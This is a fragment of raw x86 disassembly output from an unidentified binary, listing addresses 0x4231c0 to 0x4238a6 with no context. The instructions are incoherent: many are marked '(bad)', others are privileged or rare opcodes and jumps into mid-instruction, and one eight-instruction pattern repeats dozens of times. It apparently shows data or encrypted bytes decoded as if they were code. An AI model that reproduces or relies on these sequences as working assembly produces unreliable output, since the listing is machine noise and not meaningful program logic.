  4231c0:	cmp    edx,ebx
  4231c2:	fcomip st,st(4)
  4231c4:	sti    
  4231c5:	imul   eax,DWORD PTR [ebx],0x9
  4231c8:	leave  
  4231c9:	jbe    0x423241
  4231cb:	xchg   ebp,eax
  4231cc:	xor    BYTE PTR [ebx],bh
  4231ce:	rcr    edi,1
  4231d0:	icebp  
  4231d1:	(bad)  
  4231d2:	imul   eax,DWORD PTR [edx],0x48
  4231d5:	leave  
  4231d6:	jbe    0x42323e
  4231d8:	xchg   ebp,eax
  4231d9:	xor    eax,0xf1dfd23b
  4231de:	sti    
  4231df:	imul   eax,DWORD PTR [ebx],0x48
  4231e2:	dec    ecx
  4231e3:	jge    0x42324b
  4231e5:	xchg   ebp,eax
  4231e6:	xor    al,0x3b
  4231e8:	shl    DWORD PTR [edx-0x40],cl
  4231eb:	(bad)  
  4231ec:	imul   eax,DWORD PTR [ecx],0x48
  4231ef:	leave  
  4231f0:	mul    BYTE PTR [esi-0x6b]
  4231f3:	and    BYTE PTR [ebx],bh
  4231f5:	ror    edi,cl
  4231f7:	icebp  
  4231f8:	sti    
  4231f9:	imul   eax,DWORD PTR [ebx],0x58
  4231fc:	leave  
  4231fd:	jbe    0x423275
  4231ff:	xchg   ebp,eax
  423200:	xor    BYTE PTR [ebx],bh
  423202:	rcr    edi,cl
  423204:	icebp  
  423205:	jmp    0x423272
  423207:	add    ecx,DWORD PTR [eax-0x37]
  42320a:	jbe    0x423272
  42320c:	xchg   ebp,eax
  42320d:	xor    BYTE PTR [ebx],bh
  42320f:	rcr    edi,cl
  423211:	jne    0x4231a8
  423213:	pusha  
  423214:	add    esp,DWORD PTR [ecx]
  423216:	retf   0x6676
  423219:	xchg   ebp,eax
  42321a:	add    BYTE PTR [eax],dh
  42321c:	rcl    DWORD PTR [eax],cl
  42321e:	int3   
  42321f:	sti    
  423220:	imul   eax,DWORD PTR [ebx],0x48
  423223:	leave  
  423224:	jbe    0x42328c
  423226:	xchg   ebp,eax
  423227:	xor    BYTE PTR [ebx],bh
  423229:	rcr    edi,cl
  42322b:	icebp  
  42322c:	sti    
  42322d:	imul   eax,DWORD PTR [ebx],0x48
  423230:	leave  
  423231:	jbe    0x423299
  423233:	xchg   ebp,eax
  423234:	xor    BYTE PTR [ebx],bh
  423236:	rcr    edi,cl
  423238:	icebp  
  423239:	sti    
  42323a:	imul   eax,DWORD PTR [ebx],0x48
  42323d:	leave  
  42323e:	jbe    0x4232a6
  423240:	xchg   ebp,eax
  423241:	xor    BYTE PTR [ebx],bh
  423243:	rcr    edi,cl
  423245:	icebp  
  423246:	sti    
  423247:	imul   eax,DWORD PTR [ebx],0x48
  42324a:	leave  
  42324b:	jbe    0x4232b3
  42324d:	xchg   ebp,eax
  42324e:	xor    BYTE PTR [ebx],bh
  423250:	rcr    edi,cl
  423252:	icebp  
  423253:	sti    
  423254:	imul   eax,DWORD PTR [ebx],0x48
  423257:	leave  
  423258:	jbe    0x4232c0
  42325a:	xchg   ebp,eax
  42325b:	xor    BYTE PTR [ebx],bh
  42325d:	rcr    edi,cl
  42325f:	icebp  
  423260:	sti    
  423261:	imul   eax,DWORD PTR [ebx],0x48
  423264:	leave  
  423265:	jbe    0x4232cd
  423267:	xchg   ebp,eax
  423268:	xor    BYTE PTR [ebx],bh
  42326a:	rcr    edi,cl
  42326c:	icebp  
  42326d:	sti    
  42326e:	imul   eax,DWORD PTR [ebx],0x48
  423271:	leave  
  423272:	jbe    0x4232da
  423274:	xchg   ebp,eax
  423275:	xor    BYTE PTR [ebx],bh
  423277:	rcr    edi,cl
  423279:	icebp  
  42327a:	sti    
  42327b:	imul   eax,DWORD PTR [ebx],0x48
  42327e:	leave  
  42327f:	jbe    0x4232e7
  423281:	xchg   ebp,eax
  423282:	xor    BYTE PTR [ebx],bh
  423284:	rcr    edi,cl
  423286:	icebp  
  423287:	sti    
  423288:	imul   ebp,DWORD PTR ds:0x120eac3c,0xffffff95
  42328f:	xor    BYTE PTR [ebx],bh
  423291:	sar    edi,cl
  423293:	cli    
  423294:	sti    
  423295:	imul   edx,DWORD PTR [ebx],0x48
  423298:	leave  
  423299:	jbe    0x4232f7
  42329b:	xchg   ecx,eax
  42329c:	xor    BYTE PTR [ebx],bh
  42329e:	xlat   BYTE PTR ds:[ebx]
  42329f:	fcomip st,st(1)
  4232a1:	stos   DWORD PTR es:[edi],eax
  4232a2:	cs inc eax
  4232a4:	jp     0x423243
  4232a6:	cmp    DWORD PTR [esi-0x6b],esp
  4232a9:	xor    BYTE PTR [ebx],bh
  4232ab:	rcr    edi,cl
  4232ad:	sar    ebx,1
  4232af:	imul   esp,ebx,0x66
  4232b2:	mov    ebx,0x30f61405
  4232b7:	cmp    edx,ebx
  4232b9:	fbld   TBYTE PTR [ecx+0x78036bfb]
  4232bf:	ret    0x6676
  4232c2:	lds    esi,FWORD PTR [eax]
  4232c4:	cmp    edx,ebx
  4232c6:	loope  0x4232bd
  4232c8:	sti    
  4232c9:	imul   eax,DWORD PTR [ebx],0x48
  4232cc:	leave  
  4232cd:	jbe    0x423335
  4232cf:	xchg   ebp,eax
  4232d0:	xor    BYTE PTR [ebx],bh
  4232d2:	rcr    edi,cl
  4232d4:	icebp  
  4232d5:	fld    TBYTE PTR [ebx+0x3]
  4232d8:	test   al,0xc9
  4232da:	jbe    0x423342
  4232dc:	xchg   ebp,eax
  4232dd:	xor    BYTE PTR [ebx],bh
  4232df:	rcr    edi,cl
  4232e1:	icebp  
  4232e2:	sti    
  4232e3:	imul   eax,DWORD PTR [ebx],0x48
  4232e6:	leave  
  4232e7:	jbe    0x42334f
  4232e9:	xchg   ebp,eax
  4232ea:	xor    BYTE PTR [ebx],bh
  4232ec:	rcr    edi,cl
  4232ee:	icebp  
  4232ef:	sti    
  4232f0:	imul   eax,DWORD PTR [ebx],0x48
  4232f3:	leave  
  4232f4:	jbe    0x42335c
  4232f6:	xchg   ebp,eax
  4232f7:	xor    BYTE PTR [ebx],bh
  4232f9:	rcr    edi,cl
  4232fb:	icebp  
  4232fc:	sti    
  4232fd:	imul   eax,DWORD PTR [ebx],0x48
  423300:	leave  
  423301:	jbe    0x423369
  423303:	xchg   ebp,eax
  423304:	xor    BYTE PTR [ebx],bh
  423306:	rcr    edi,cl
  423308:	icebp  
  423309:	sti    
  42330a:	imul   eax,DWORD PTR [ebx],0x48
  42330d:	leave  
  42330e:	jbe    0x423376
  423310:	xchg   ebp,eax
  423311:	xor    BYTE PTR [ebx],bh
  423313:	rcr    edi,cl
  423315:	icebp  
  423316:	sti    
  423317:	imul   eax,DWORD PTR [ebx],0x48
  42331a:	leave  
  42331b:	jbe    0x423383
  42331d:	xchg   ebp,eax
  42331e:	xor    BYTE PTR [ebx],bh
  423320:	rcr    edi,cl
  423322:	icebp  
  423323:	sti    
  423324:	imul   eax,DWORD PTR [ebx],0x48
  423327:	leave  
  423328:	jbe    0x423390
  42332a:	xchg   ebp,eax
  42332b:	xor    BYTE PTR [ebx],bh
  42332d:	rcr    edi,cl
  42332f:	icebp  
  423330:	sti    
  423331:	imul   eax,DWORD PTR [ebx],0x48
  423334:	leave  
  423335:	jbe    0x42339d
  423337:	xchg   ebp,eax
  423338:	xor    BYTE PTR [ebx],bh
  42333a:	rcr    edi,cl
  42333c:	icebp  
  42333d:	sti    
  42333e:	imul   eax,DWORD PTR [ebx],0x48
  423341:	leave  
  423342:	jbe    0x4233aa
  423344:	xchg   ebp,eax
  423345:	xor    BYTE PTR [ebx],bh
  423347:	rcr    edi,cl
  423349:	icebp  
  42334a:	sti    
  42334b:	imul   eax,DWORD PTR [ebx],0x48
  42334e:	leave  
  42334f:	jbe    0x4233b7
  423351:	xchg   ebp,eax
  423352:	xor    BYTE PTR [ebx],bh
  423354:	rcr    edi,cl
  423356:	icebp  
  423357:	sti    
  423358:	imul   eax,DWORD PTR [ebx],0x48
  42335b:	leave  
  42335c:	jbe    0x4233c4
  42335e:	xchg   ebp,eax
  42335f:	xor    BYTE PTR [ebx],bh
  423361:	rcr    edi,cl
  423363:	icebp  
  423364:	sti    
  423365:	imul   eax,DWORD PTR [ebx],0x48
  423368:	leave  
  423369:	jbe    0x4233d1
  42336b:	xchg   ebp,eax
  42336c:	xor    BYTE PTR [ebx],bh
  42336e:	rcr    edi,cl
  423370:	icebp  
  423371:	sti    
  423372:	imul   eax,DWORD PTR [ebx],0x48
  423375:	leave  
  423376:	jbe    0x4233de
  423378:	xchg   ebp,eax
  423379:	xor    BYTE PTR [ebx],bh
  42337b:	rcr    edi,cl
  42337d:	icebp  
  42337e:	sti    
  42337f:	imul   eax,DWORD PTR [ebx],0x48
  423382:	leave  
  423383:	jbe    0x4233eb
  423385:	xchg   ebp,eax
  423386:	xor    BYTE PTR [ebx],bh
  423388:	rcr    edi,cl
  42338a:	icebp  
  42338b:	sti    
  42338c:	imul   eax,DWORD PTR [ebx],0x48
  42338f:	leave  
  423390:	jbe    0x4233f8
  423392:	xchg   ebp,eax
  423393:	xor    BYTE PTR [ebx],bh
  423395:	rcr    edi,cl
  423397:	icebp  
  423398:	sti    
  423399:	imul   eax,DWORD PTR [ebx],0x48
  42339c:	leave  
  42339d:	jbe    0x423405
  42339f:	xchg   ebp,eax
  4233a0:	xor    BYTE PTR [ebx],bh
  4233a2:	rcr    edi,cl
  4233a4:	icebp  
  4233a5:	sti    
  4233a6:	imul   eax,DWORD PTR [ebx],0x48
  4233a9:	leave  
  4233aa:	jbe    0x423412
  4233ac:	xchg   ebp,eax
  4233ad:	xor    BYTE PTR [ebx],bh
  4233af:	rcr    edi,cl
  4233b1:	icebp  
  4233b2:	sti    
  4233b3:	imul   eax,DWORD PTR [ebx],0x48
  4233b6:	leave  
  4233b7:	jbe    0x42341f
  4233b9:	xchg   ebp,eax
  4233ba:	xor    BYTE PTR [ebx],bh
  4233bc:	rcr    edi,cl
  4233be:	icebp  
  4233bf:	sti    
  4233c0:	imul   eax,DWORD PTR [ebx],0x48
  4233c3:	leave  
  4233c4:	jbe    0x42342c
  4233c6:	xchg   ebp,eax
  4233c7:	xor    BYTE PTR [ebx],bh
  4233c9:	rcr    edi,cl
  4233cb:	icebp  
  4233cc:	sti    
  4233cd:	imul   eax,DWORD PTR [ebx],0x48
  4233d0:	leave  
  4233d1:	jbe    0x423439
  4233d3:	xchg   ebp,eax
  4233d4:	xor    BYTE PTR [ebx],bh
  4233d6:	rcr    edi,cl
  4233d8:	icebp  
  4233d9:	sti    
  4233da:	imul   eax,DWORD PTR [ebx],0x48
  4233dd:	leave  
  4233de:	jbe    0x423446
  4233e0:	xchg   ebp,eax
  4233e1:	xor    BYTE PTR [ebx],bh
  4233e3:	rcr    edi,cl
  4233e5:	icebp  
  4233e6:	sti    
  4233e7:	imul   eax,DWORD PTR [ebx],0x48
  4233ea:	leave  
  4233eb:	jbe    0x423453
  4233ed:	xchg   ebp,eax
  4233ee:	xor    BYTE PTR [ebx],bh
  4233f0:	rcr    edi,cl
  4233f2:	icebp  
  4233f3:	sti    
  4233f4:	imul   eax,DWORD PTR [ebx],0x48
  4233f7:	leave  
  4233f8:	jbe    0x423460
  4233fa:	xchg   ebp,eax
  4233fb:	xor    BYTE PTR [ebx],bh
  4233fd:	rcr    edi,cl
  4233ff:	icebp  
  423400:	sti    
  423401:	imul   eax,DWORD PTR [ebx],0x48
  423404:	leave  
  423405:	jbe    0x42346d
  423407:	xchg   ebp,eax
  423408:	xor    BYTE PTR [ebx],bh
  42340a:	rcr    edi,cl
  42340c:	icebp  
  42340d:	sti    
  42340e:	imul   eax,DWORD PTR [ebx],0x48
  423411:	leave  
  423412:	jbe    0x42347a
  423414:	xchg   ebp,eax
  423415:	xor    BYTE PTR [ebx],bh
  423417:	rcr    edi,cl
  423419:	icebp  
  42341a:	sti    
  42341b:	imul   eax,DWORD PTR [ebx],0x48
  42341e:	leave  
  42341f:	jbe    0x423487
  423421:	xchg   ebp,eax
  423422:	xor    BYTE PTR [ebx],bh
  423424:	rcr    edi,cl
  423426:	icebp  
  423427:	sti    
  423428:	imul   eax,DWORD PTR [ebx],0x48
  42342b:	leave  
  42342c:	jbe    0x423494
  42342e:	xchg   ebp,eax
  42342f:	xor    BYTE PTR [ebx],bh
  423431:	rcr    edi,cl
  423433:	icebp  
  423434:	sti    
  423435:	imul   eax,DWORD PTR [ebx],0x48
  423438:	leave  
  423439:	jbe    0x4234a1
  42343b:	xchg   ebp,eax
  42343c:	xor    BYTE PTR [ebx],bh
  42343e:	rcr    edi,cl
  423440:	icebp  
  423441:	sti    
  423442:	imul   eax,DWORD PTR [ebx],0x48
  423445:	leave  
  423446:	jbe    0x4234ae
  423448:	xchg   ebp,eax
  423449:	xor    BYTE PTR [ebx],bh
  42344b:	rcr    edi,cl
  42344d:	icebp  
  42344e:	sti    
  42344f:	imul   eax,DWORD PTR [ebx],0x48
  423452:	leave  
  423453:	jbe    0x4234bb
  423455:	xchg   ebp,eax
  423456:	xor    BYTE PTR [ebx],bh
  423458:	rcr    edi,cl
  42345a:	icebp  
  42345b:	sti    
  42345c:	imul   eax,DWORD PTR [ebx],0x48
  42345f:	leave  
  423460:	jbe    0x4234c8
  423462:	xchg   ebp,eax
  423463:	xor    BYTE PTR [ebx],bh
  423465:	rcr    edi,cl
  423467:	icebp  
  423468:	sti    
  423469:	imul   eax,DWORD PTR [ebx],0x48
  42346c:	leave  
  42346d:	jbe    0x4234d5
  42346f:	xchg   ebp,eax
  423470:	xor    BYTE PTR [ebx],bh
  423472:	rcr    edi,cl
  423474:	icebp  
  423475:	sti    
  423476:	imul   eax,DWORD PTR [ebx],0x48
  423479:	leave  
  42347a:	jbe    0x4234e2
  42347c:	xchg   ebp,eax
  42347d:	xor    BYTE PTR [ebx],bh
  42347f:	rcr    edi,cl
  423481:	icebp  
  423482:	sti    
  423483:	imul   eax,DWORD PTR [ebx],0x48
  423486:	leave  
  423487:	jbe    0x4234ef
  423489:	xchg   ebp,eax
  42348a:	xor    BYTE PTR [ebx],bh
  42348c:	rcr    edi,cl
  42348e:	icebp  
  42348f:	sti    
  423490:	imul   eax,DWORD PTR [ebx],0x48
  423493:	leave  
  423494:	jbe    0x4234fc
  423496:	xchg   ebp,eax
  423497:	xor    BYTE PTR [ebx],bh
  423499:	xchg   esp,eax
  42349a:	xor    ebx,edi
  42349c:	sti    
  42349d:	inc    esp
  42349e:	add    ecx,DWORD PTR [eax-0x27]
  4234a1:	jbe    0x423509
  4234a3:	mov    edi,0xb9a2e192
  4234a8:	push   cs
  4234a9:	(bad)  
  4234aa:	cmc    
  4234ab:	test   BYTE PTR [eax],bl
  4234ad:	and    al,0x40
  4234af:	mov    es,WORD PTR [esi-0x514a517c]
  4234b5:	jne    0x423458
  4234b7:	js     0x42346b
  4234b9:	(bad)  
  4234ba:	fistp  WORD PTR [ebx]
  4234bc:	sbb    BYTE PTR [edi],0xb1
  4234bf:	std    
  4234c0:	std    
  4234c1:	mov    ebp,0x3052c461
  4234c6:	pop    es
  4234c7:	js     0x42352a
  4234c9:	inc    esp
  4234ca:	xchg   ebp,eax
  4234cb:	pop    ss
  4234cc:	pushf  
  4234cd:	pop    ebx
  4234ce:	mov    ah,BYTE PTR [eax+0x7531c296]
  4234d4:	adc    al,0x62
  4234d6:	xlat   BYTE PTR ds:[ebx]
  4234d7:	cmc    
  4234d8:	and    BYTE PTR [eax-0xb],ah
  4234db:	into   
  4234dc:	push   ds
  4234dd:	xchg   edx,eax
  4234de:	retf   0xaf6f
  4234e1:	jae    0x42353d
  4234e3:	mov    eax,ds:0xe5c56418
  4234e8:	scas   eax,DWORD PTR es:[edi]
  4234e9:	cmp    al,0x62
  4234eb:	imul   esp,DWORD PTR [ebx+0x1fe1cd81],0xce4e2caa
  4234f5:	outs   dx,BYTE PTR ds:[esi]
  4234f6:	pop    edi
  4234f7:	sub    al,0xf0
  4234f9:	fisttp DWORD PTR [edi]
  4234fb:	cmp    DWORD PTR [edx+0x2f],0xffffff98
  4234ff:	pop    esp
  423500:	sbb    DWORD PTR [ecx-0x2e],0xf48d05b9
  423507:	jne    0x4234cc
  423509:	adc    esi,DWORD PTR [eax]
  42350b:	and    esi,ebx
  42350d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42350e:	adc    edi,DWORD PTR [edi-0x18d74fd9]
  423514:	stos   BYTE PTR es:[edi],al
  423515:	and    BYTE PTR [esi+0x10e8162d],ah
  42351b:	jae    0x4234f8
  42351d:	sbb    dh,BYTE PTR [eax-0xb]
  423520:	inc    edi
  423521:	stos   BYTE PTR es:[edi],al
  423522:	push   ds
  423523:	add    al,0x45
  423525:	xchg   edx,eax
  423526:	sbb    eax,0x94fe03e8
  42352b:	mov    eax,ds:0x4a193d23
  423530:	mov    edx,0x39db4125
  423535:	cmp    eax,DWORD PTR ds:0x2e3b393b
  42353b:	outs   dx,BYTE PTR ds:[esi]
  42353c:	xchg   eax,eax
  42353e:	pop    ebp
  42353f:	call   0x5aaf2e18
  423544:	mov    eax,ds:0x63310865
  423549:	js     0x4234cc
  42354b:	mov    DWORD PTR [eax-0x37],ebp
  42354e:	fsub   QWORD PTR [eax]
  423550:	push   ecx
  423551:	cmp    ah,BYTE PTR [ecx-0x32ddd1fd]
  423557:	mov    eax,gs
  423559:	shl    BYTE PTR [esi+0x741e9a3],cl
  42355f:	repnz in eax,dx
  423561:	stos   BYTE PTR es:[edi],al
  423562:	inc    ecx
  423563:	sbb    al,0xb8
  423565:	lds    esi,FWORD PTR [edx]
  423567:	loopne 0x423558
  423569:	int    0x7a
  42356b:	shl    DWORD PTR [ecx],cl
  42356d:	mov    bl,0xd8
  42356f:	je     0x42356e
  423571:	inc    esp
  423572:	mov    dh,dh
  423574:	adc    BYTE PTR [edx+eax*8+0x3d],0xec
  423579:	cmp    BYTE PTR [edi],0xd7
  42357c:	sbb    bl,BYTE PTR [eax+0x5b]
  42357f:	imul   BYTE PTR [edx+eiz*2+0x221457ac]
  423586:	pop    ebp
  423587:	mov    al,0x44
  423589:	arpl   WORD PTR [edx-0x3dd85d1b],dx
  42358f:	xchg   ebx,eax
  423590:	popa   
  423591:	add    al,0x4d
  423593:	clc    
  423594:	xor    BYTE PTR [eax+0x1b],ah
  423597:	jb     0x423609
  423599:	out    0xdb,eax
  42359b:	scas   eax,DWORD PTR es:[edi]
  42359c:	mov    ds:0xf88cc1b0,al
  4235a1:	in     al,0x28
  4235a3:	jecxz  0x4235ab
  4235a5:	xor    edi,DWORD PTR [edi+eiz*4+0x789c7d56]
  4235ac:	fisubr DWORD PTR [ebp+ebp*2-0xb]
  4235b0:	leave  
  4235b1:	push   ds
  4235b2:	call   0x17e33a03
  4235b7:	stc    
  4235b8:	(bad)  
  4235b9:	mov    ah,0xc0
  4235bb:	cmc    
  4235bc:	in     al,dx
  4235bd:	pop    edi
  4235be:	pop    edx
  4235bf:	cwde   
  4235c0:	jne    0x4235ea
  4235c2:	lock cmp DWORD PTR [edi],ebp
  4235c5:	sub    DWORD PTR [edi+ebx*4-0x48],ebp
  4235c9:	loope  0x423584
  4235cb:	lods   eax,DWORD PTR ds:[esi]
  4235cc:	outs   dx,DWORD PTR ds:[esi]
  4235cd:	fistp  QWORD PTR [eax-0x37]
  4235d0:	jle    0x423553
  4235d2:	daa    
  4235d3:	enter  0x611e,0xfc
  4235d7:	fs mov edi,0xd17f1346
  4235dd:	bound  esp,QWORD PTR [esi]
  4235df:	sub    DWORD PTR [edx],esi
  4235e1:	sub    eax,0x601a436c
  4235e6:	push   ds
  4235e7:	xchg   esi,eax
  4235e8:	fwait
  4235e9:	cmp    al,0x7
  4235eb:	(bad)  
  4235ec:	call   0x829e:0x96af145c
  4235f3:	test   DWORD PTR [ebx+0x6dca96eb],ebx
  4235f9:	sub    al,bl
  4235fb:	dec    ecx
  4235fc:	stos   BYTE PTR es:[edi],al
  4235fd:	fisub  WORD PTR [si]
  423600:	aad    0x97
  423602:	mov    ds:0x8d6bdbd5,eax
  423607:	jns    0x42359d
  423609:	fcomp  DWORD PTR [eax+0x39c4c2a4]
  42360f:	cwde   
  423610:	lods   al,BYTE PTR ds:[esi]
  423611:	sub    BYTE PTR [edx],ah
  423613:	dec    edx
  423614:	outs   dx,BYTE PTR ds:[esi]
  423615:	inc    eax
  423616:	(bad)  
  423617:	repnz mov ecx,ebp
  42361a:	or     BYTE PTR [edx-0x76],dl
  42361d:	outs   dx,BYTE PTR ds:[esi]
  42361e:	mov    eax,ds:0xd792d5ef
  423623:	mov    ch,BYTE PTR [ecx+0x154bad02]
  423629:	mov    cl,ch
  42362b:	test   eax,0x852b9209
  423630:	inc    edx
  423631:	(bad)  
  423632:	sbb    bl,BYTE PTR [ebp-0x37]
  423635:	mov    edi,0x23f2b7f2
  42363a:	mov    ecx,0xe0760246
  42363f:	mov    DWORD PTR [ecx+eiz*8+0x2e],esi
  423643:	jmp    0x389843e0
  423648:	dec    ebx
  423649:	out    dx,al
  42364a:	fcom   QWORD PTR [eax]
  42364c:	adc    BYTE PTR es:[ecx],ah
  42364f:	jecxz  0x42368e
  423651:	inc    DWORD PTR [eax-0x4c]
  423654:	repz icebp 
  423656:	push   cs
  423657:	mov    ah,0xad
  423659:	and    ah,bl
  42365b:	les    edx,FWORD PTR [eax-0xe1d3e86]
  423661:	popa   
  423662:	sbb    DWORD PTR [ebp-0x61],0xd807efb0
  423669:	inc    edx
  42366a:	pop    ecx
  42366b:	sbb    esi,DWORD PTR [eax+0x73eb3bcf]
  423671:	mov    dh,0x81
  423673:	jne    0x423670
  423675:	sub    DWORD PTR [edi],0x6b243930
  42367b:	ds out dx,eax
  42367d:	test   DWORD PTR [esi-0x1c205a1],ebx
  423683:	iret   
  423684:	fwait
  423685:	and    al,0xfc
  423687:	xor    ecx,DWORD PTR [ebx+0x1e51f809]
  42368d:	inc    ebx
  42368e:	mov    cl,0xe1
  423690:	or     DWORD PTR [edx-0x354a8a8c],ebx
  423696:	popf   
  423697:	jae    0x423635
  423699:	and    DWORD PTR [eax+0x15],eax
  42369c:	sub    edx,DWORD PTR [ebp+0x6c]
  42369f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4236a0:	push   edi
  4236a1:	outs   dx,DWORD PTR ds:[esi]
  4236a2:	ret    
  4236a3:	xor    esp,ebp
  4236a5:	push   eax
  4236a6:	sbb    BYTE PTR [ecx+eiz*2+0x7600e19d],bl
  4236ad:	dec    esi
  4236ae:	mov    edx,0x7567327a
  4236b3:	cs mov bh,0x6
  4236b6:	xchg   ebp,eax
  4236b7:	dec    edi
  4236b8:	dec    edx
  4236b9:	xchg   ecx,eax
  4236ba:	aam    0xb9
  4236bc:	and    BYTE PTR fs:[ebx],al
  4236bf:	mov    edx,0xbd2dcb15
  4236c4:	xchg   edi,eax
  4236c5:	xor    eax,0xa2bf2f2b
  4236ca:	mov    eax,0xff0621ad
  4236cf:	jae    0x4236ec
  4236d1:	and    DWORD PTR [esi+esi*2+0x64],ebp
  4236d5:	fcom   QWORD PTR [esi]
  4236d7:	imul   edi,ebp,0x7a
  4236da:	jl     0x423700
  4236dc:	ins    DWORD PTR es:[edi],dx
  4236dd:	sbb    ch,BYTE PTR [esi+0x1a916c17]
  4236e3:	les    eax,FWORD PTR [ebp-0x41]
  4236e6:	cmp    BYTE PTR [edx+0x1ac2206],dh
  4236ec:	pop    eax
  4236ed:	es ss push cs
  4236f0:	pop    ecx
  4236f1:	bnd ja 0x42368a
  4236f4:	ins    DWORD PTR es:[edi],dx
  4236f5:	sbb    al,BYTE PTR [eax]
  4236f7:	pop    ecx
  4236f8:	inc    edi
  4236f9:	call   0x3ca4950b
  4236fe:	test   BYTE PTR [esi],al
  423700:	mov    ch,0xbb
  423702:	fcom   DWORD PTR [ebp-0x1c]
  423705:	mov    ebx,0xee073928
  42370a:	sbb    eax,0xfdb61a58
  42370f:	and    ecx,DWORD PTR [edx]
  423711:	and    edx,DWORD PTR [ebx-0x65df36c]
  423717:	out    0x9f,eax
  423719:	sbb    al,0x1b
  42371b:	nop
  42371c:	mov    ds:0x505a662a,eax
  423721:	sbb    eax,0xfc37a8d1
  423726:	arpl   WORD PTR [ebx+ebp*2],bx
  423729:	rcr    DWORD PTR [ebp-0x5928b286],1
  42372f:	push   es
  423730:	cli    
  423731:	and    eax,0x575a6e0a
  423736:	xchg   ebp,eax
  423737:	in     al,dx
  423738:	pop    es
  423739:	repz test BYTE PTR [ebp-0x16ceeafe],dl
  423740:	push   esp
  423741:	lods   eax,DWORD PTR ds:[esi]
  423742:	(bad)  
  423744:	inc    edi
  423745:	xchg   edx,eax
  423746:	pushf  
  423747:	adc    edi,esp
  423749:	and    bh,ah
  42374b:	retf   
  42374c:	xchg   edx,eax
  42374d:	pop    edi
  42374e:	nop
  42374f:	mov    ebp,0xdde7d9e4
  423754:	inc    esi
  423755:	aad    0x4d
  423757:	retf   0x603c
  42375a:	push   ss
  42375b:	pusha  
  42375c:	sub    al,al
  42375e:	jg     0x4236e3
  423760:	xchg   esp,eax
  423761:	repnz push edx
  423763:	shl    DWORD PTR [ebx-0x289fd913],1
  423769:	out    0x62,eax
  42376b:	add    eax,0x171ecd3e
  423770:	cmp    DWORD PTR [edi-0x66],ebp
  423773:	jl     0x42371d
  423775:	in     al,dx
  423776:	test   al,0x8
  423778:	rcl    ah,cl
  42377a:	xchg   ecx,eax
  42377b:	call   0x352:0x26cf56bf
  423782:	push   es
  423783:	dec    edi
  423784:	mov    ebp,0x59b12a39
  423789:	xchg   edi,eax
  42378a:	mov    bl,0x3d
  42378c:	cwde   
  42378d:	cmp    eax,0x6648bec7
  423792:	pop    eax
  423793:	and    eax,0x1169803c
  423798:	and    BYTE PTR [edi+0x7a],bh
  42379b:	sbb    cl,0x4
  42379e:	xor    ah,BYTE PTR [edi-0x21]
  4237a1:	adc    BYTE PTR [ebx],dl
  4237a3:	mov    edi,0xc8b55c62
  4237a8:	imul   dl
  4237aa:	fimul  WORD PTR [edx-0x27]
  4237ad:	pusha  
  4237ae:	stos   BYTE PTR es:[edi],al
  4237af:	adc    eax,0x7c8a52d0
  4237b4:	lods   eax,DWORD PTR ds:[esi]
  4237b5:	jns    0x4237c7
  4237b7:	sub    eax,0xd15f261f
  4237bc:	(bad)  [edi+0xb66ab7b]
  4237c2:	mov    esp,0x4a24037f
  4237c7:	jp     0x42375e
  4237c9:	cmp    eax,0xf9fd678e
  4237ce:	or     esp,DWORD PTR [ebx+0x20]
  4237d1:	fwait
  4237d2:	hlt    
  4237d3:	rol    BYTE PTR [eax-0x61ef6c7c],1
  4237d9:	dec    ebx
  4237da:	das    
  4237db:	dec    edx
  4237dc:	std    
  4237dd:	ret    
  4237de:	mov    WORD PTR [esi-0x797eaf6f],?
  4237e4:	add    DWORD PTR ds:0xdb843d1c,edx
  4237ea:	test   al,0xc2
  4237ec:	sbb    ebp,DWORD PTR [eax+0x41]
  4237ef:	jg     0x42377e
  4237f1:	jmp    0x4237b3
  4237f3:	sub    ecx,esp
  4237f5:	popa   
  4237f6:	xor    BYTE PTR [esi],bh
  4237f8:	dec    esi
  4237f9:	push   esi
  4237fa:	pop    esi
  4237fb:	imul   ebp,DWORD PTR [ecx+0x3db77f12],0xfffffff4
  423802:	sub    ch,BYTE PTR [ecx-0x76]
  423805:	adc    bl,BYTE PTR [esi+0x7e]
  423808:	pop    esi
  423809:	jae    0x423856
  42380b:	mov    al,BYTE PTR [ebp+0x2654af58]
  423811:	and    eax,0xf4d17e42
  423816:	lods   eax,DWORD PTR ds:[esi]
  423817:	es dec esp
  423819:	fidiv  WORD PTR [edi-0x42]
  42381c:	or     DWORD PTR [edx+0x140121c7],ebx
  423822:	mov    al,0x3b
  423824:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423825:	jmp    0x6376cb48
  42382a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42382b:	stos   DWORD PTR es:[edi],eax
  42382c:	mov    ch,0x96
  42382e:	and    ebx,DWORD PTR [ecx+0x60]
  423831:	fistp  QWORD PTR [ecx+ebx*2]
  423834:	cmp    al,0x8e
  423836:	jno    0x423824
  423838:	and    DWORD PTR gs:[esi],0x35
  42383c:	and    DWORD PTR [ebp+0x7d],ebp
  42383f:	xor    dh,bl
  423841:	jbe    0x4237d4
  423843:	or     ecx,ebx
  423845:	push   0xffffffd5
  423847:	add    al,0xf
  423849:	xchg   ecx,eax
  42384a:	mov    edi,0xe8c487e0
  42384f:	(bad)  [ebx+0x172a22a9]
  423855:	cmp    BYTE PTR [ebp+0x3f],bh
  423858:	aaa    
  423859:	mov    bh,0x18
  42385b:	inc    edi
  42385c:	iret   
  42385d:	shl    DWORD PTR [esi],1
  42385f:	xchg   ecx,eax
  423860:	into   
  423861:	add    eax,0x4fe26c6
  423866:	stc    
  423867:	(bad)  
  423868:	sub    BYTE PTR [ebx],ch
  42386a:	mov    ds:0x5b9e530e,eax
  42386f:	add    cl,BYTE PTR [ecx-0x6f06deba]
  423875:	sbb    ecx,DWORD PTR [ecx-0x5a9c4c19]
  42387b:	push   es
  42387c:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  42387e:	adc    eax,0xafc67cdf
  423883:	xchg   BYTE PTR [edx],ch
  423885:	push   cs
  423886:	pop    ecx
  423887:	jns    0x4238df
  423889:	adc    BYTE PTR [eax+0x30],bl
  42388c:	jns    0x4238b2
  42388e:	mov    ds:0x18c4af1b,eax
  423893:	xchg   esp,eax
  423894:	js     0x42384c
  423896:	xchg   DWORD PTR [edi+0xf],ecx
  423899:	sar    BYTE PTR [ebp-0x75],1
  42389c:	(bad)  
  42389d:	cmp    esp,esi
  42389f:	or     eax,0x56ec3177
  4238a4:	aad    0xcb
  4238a6:	sar    BYTE PTR [ebx+0x2f12e63c],1
